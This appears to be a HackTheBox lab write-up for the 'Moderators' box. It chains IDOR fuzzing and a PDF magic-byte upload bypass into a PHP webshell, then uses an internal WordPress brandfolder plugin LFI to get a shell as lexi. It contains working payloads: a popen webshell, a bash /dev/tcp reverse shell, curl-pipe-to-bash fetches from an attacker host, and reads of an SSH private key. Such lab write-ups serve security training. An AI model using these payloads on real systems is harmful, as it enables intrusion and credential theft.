---
title: "Moderators"
date: 2026-12-27 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, idor, file-upload, lfi, wordpress, rce]
image:
    path: /assets/Images/Moderators-avatar.png
    alt: Moderators
description: "Chaining an IDOR on a security-report blog into a magic-byte file-upload bypass for RCE as www-data, then abusing an internal WordPress brandfolder plugin LFI to land a shell as the lexi user."
---
## Overview

Moderators is a hard-difficulty Linux box centred on a blog that publishes security reports. An Insecure Direct Object Reference (IDOR) exposes hidden reports, one of which leads to a log-upload page where a PDF filter is bypassed to drop a PHP webshell (RCE as `www-data`). An internal WordPress instance on port 8080 then runs a vulnerable `brandfolder` plugin whose Local File Inclusion yields a shell as `lexi`, who owns the user flag. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 150.0,150.0 111.2,203.4 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Enumeration-driven web chain (IDOR fuzzing, MD5-named log dir, upload fuzzing) into a magic-byte upload bypass and a brandfolder plugin LFI; high enum and realistic with no named CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | no creds yet |
| 80/tcp | Apache2 | the blog / report application |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.5.229 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.5.229
```

Only two ports. The web app on 80 is the entire attack surface — a blog linking to security "reports" addressed by a numeric ID in the URL (`reports.php?report=8121`).

## Enumeration

The numeric report ID is a classic IDOR target. Generate a numeric wordlist and fuzz it, filtering the default "not found" response by word count:

```bash
seq 1111 9999 > report_ids
ffuf -u 'http://10.129.5.229/reports.php?report=FUZZ' -w report_ids -fw 3091
```

Six reports exist. Report `9798` references a `LOGS` object and a path `logs/<hash>/`. The directory name turns out to be the MD5 of the report ID:

```bash
echo -n 9798 | md5sum
```

Fuzzing inside that directory for document files surfaces a `logs.pdf`, and report `2589` mentions an upload page at `/logs/report_log_upload.php`:

```bash
ffuf -u 'http://10.129.5.229/logs/<hash>/FUZZ' -w /usr/share/wordlists/dirb/common.txt -e .pdf,.doc,.docx
```

## Foothold

**1. Bypass the PDF upload filter.** The upload checks the extension, the MIME type, and the leading magic bytes — all attacker-controlled. A file named `rp.pdf.php`, beginning with the `%PDF-` magic prefix, sent with `Content-Type: application/pdf`, passes every check while still executing as PHP. Since `system()` is disabled, use `popen()`:

```bash
printf '%%PDF-<?php echo fread(popen($_GET["cmd"],"r"),4096); ?>' > rp.pdf.php
```

Intercept the upload in Burp and set the part's `Content-Type` to `application/pdf`. Then brute-force the upload directory:

```bash
ffuf -u 'http://10.129.5.229/logs/FUZZ' -w /usr/share/wordlists/dirb/common.txt
```

**2. Get RCE and a reverse shell.**

```bash
curl 'http://10.129.5.229/logs/uploads/rp.pdf.php?cmd=id'
printf '#!/bin/bash\nbash -i >& /dev/tcp/<lhost>/1337 0>&1\n' > shell.sh
python3 -m http.server 8080      # attacker
nc -lvnp 1337                    # attacker
curl 'http://10.129.5.229/logs/uploads/rp.pdf.php?cmd=curl+<lhost>:8080%2Fshell.sh|bash'
```

This lands a shell as `www-data`.

**3. Pivot to the internal WordPress (lexi).** A service listens only on localhost:8080 — a WordPress site under `/opt/site.new` running as `lexi`, with a vulnerable `brandfolder` plugin. Its `callback.php` builds a `require_once()` path from the `wp_abspath` request parameter, so dropping a payload in a writable directory and pointing the parameter at it gives code execution as `lexi`:

```bash
ss -tlpn
ls -l /opt/site.new/wp-content/plugins/
echo '<?php echo fread(popen("curl <lhost>:8000/shell.sh|bash","r"),4096); ?>' > /dev/shm/wp-load.php
nc -lvnp 4444   # attacker
curl -s 'http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/'
```

`lexi` has an SSH key in their home directory, giving stable access:

```bash
cat /home/lexi/.ssh/id_rsa
ssh -i lexi.ssh lexi@10.129.5.229
```

## User flag

```bash
cat /home/lexi/user.txt   # HTB{...}
```

Access as `lexi` achieved.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Moderators-avatar.png" alt="Moderators" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
